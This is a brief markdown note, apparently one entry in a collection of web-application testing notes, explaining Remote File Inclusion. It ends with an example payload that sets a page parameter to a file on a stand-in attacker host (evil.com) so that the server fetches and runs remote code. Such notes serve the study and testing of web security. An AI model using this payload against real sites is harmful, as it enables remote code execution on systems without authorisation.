
---

### 25. **Web_Application_Testing/File_Inclusion/RFI.md**

```markdown
# Remote File Inclusion (RFI)

## Overview
Remote File Inclusion (RFI) allows attackers to include remote files from other servers, which can lead to arbitrary code execution.

## Techniques
- **Remote File Inclusion** - Including files from external sources.

## Example
RFI payload:
```plaintext
?page=http://evil.com/malicious.txt

